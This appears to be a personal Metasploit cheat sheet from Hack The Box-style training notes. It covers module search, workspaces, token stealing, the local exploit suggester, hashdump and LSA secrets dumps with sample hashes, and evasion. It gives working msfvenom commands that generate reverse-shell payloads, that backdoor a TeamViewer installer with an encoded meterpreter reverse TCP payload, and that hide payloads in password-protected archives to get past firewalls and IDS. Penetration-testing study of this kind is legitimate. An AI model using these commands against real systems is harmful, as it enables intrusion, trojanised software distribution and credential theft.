### <span style="color:#b103fc"> MSF Structure Engagement </span>

![[Pasted image 20230503231407.png]]

### Coarse Search
```bash 
msf6 > search eternalromance
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

### Grep

```shell
grep meterpreter show payloads
```

### Encodings
-----
shikate ga nai
```shell
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

### Workspace
----
```shell
msf6 > workspace -a Target_1 # Create workspace & select
msf6 > workspace Target_1 # Select
msf6 > workspace  # List
```

Import scans
```ruby
msf6 > db_import Target.xml # import 
msf6 > hosts # show
msf6 > services
```

nmap inside msfconsole
```ruby
db_nmap -sV -sC -sS 10.0.0.1 # initial
```


### Migrating proccess
-------
```shell
meterpreter > ps # show running proccess
meterpreter > steal_token <PID> # Migrate to proccess
```



### Local  exploit suggester
-------
```shell
Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester    
```

### hash dump

```shell
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::


meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
```

### MSF - Meterpreter LSA Secrets Dump

```css
meterpreter > lsa_dump_secrets

[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
```


### Firewall and iDS/IPS Evasion
----
- Backdoored executable
hide shellcode inside an existing installer 
```css
Sauuron@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

archives

```css
Sauuron@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
Sauuron@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
Sauuron@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
Sauuron@htb[/htb]$ rar a ~/test.rar -p ~/test.js
Sauuron@htb[/htb]$ r rar a test2.rar -p test; mv test2.rar test2
```
